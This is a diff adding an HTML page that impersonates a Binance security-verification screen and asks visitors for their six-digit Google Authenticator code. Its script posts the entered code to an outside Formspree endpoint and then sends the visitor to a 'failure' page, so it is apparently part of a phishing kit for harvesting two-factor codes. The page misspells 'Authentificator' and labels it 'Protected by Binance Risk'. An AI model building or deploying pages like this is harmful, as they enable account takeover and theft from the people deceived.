@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email Verification</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <h2>Security Verification</h2>
+      
+      <p>Enter the 6-digit verification code. Check your <b>Google Authentificator App</b>.</p>
+      <form action="https://formspree.io/f/xdkovoan" method="POST" id="authForm">
+        <label for="verification-code">Google Authentificator</label>
+        <div class="otp-container">
+            <input type="text" maxlength="1" class="otp-box" id="auth-code" name="code" />
+            <input type="text" maxlength="1" class="otp-box" id="auth-code" name="code" />
+            <input type="text" maxlength="1" class="otp-box" id="auth-code" name="code" />
+            <input type="text" maxlength="1" class="otp-box" id="auth-code" name="code" />
+            <input type="text" maxlength="1" class="otp-box" id="auth-code" name="code" />
+            <input type="text" maxlength="1" class="otp-box" id="auth-code" name="code" />
+          </div>
+        
+        <button type="submit">Confirm</button>
+      </form>
+      <a href="Verification.html" class="link">Security verification unavailable?</a>
+      <a href="Verification.html" class="link">Login using Email</a>
+      <footer>Protected by Binance Risk</footer>
+    </div>
+  </div>
+
+  
+  
+  <script>
+const otpBoxes = document.querySelectorAll('.otp-box');
+
+otpBoxes.forEach((box, index) => {
+  box.addEventListener('input', (e) => {
+    // Move to the next box if input is not empty
+    if (e.target.value !== '' && index < otpBoxes.length - 1) {
+      otpBoxes[index + 1].focus();
+    }
+  });
+
+  // Handle Backspace to move to the previous box
+  box.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
+      otpBoxes[index - 1].focus();
+    }
+  });
+});
+
+
+     // Attach the button click event listener
+     document.getElementById('authForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default submission
+
+      var form = event.target;
+      var formData = new FormData(form);
+
+      // Submit the form data asynchronously
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => {
+        // Redirect to failure.html after successful form submission
+        window.location.href = 'failure.html';
+      })
+      .catch(error => {
+        // If there is a network error, still redirect to failure.html
+        console.error('Error submitting verification form:', error);
+        window.location.href = 'failure.html';
+        
+      });
+      
+    });
+
+    
+  </script>
+</body>
+</html>
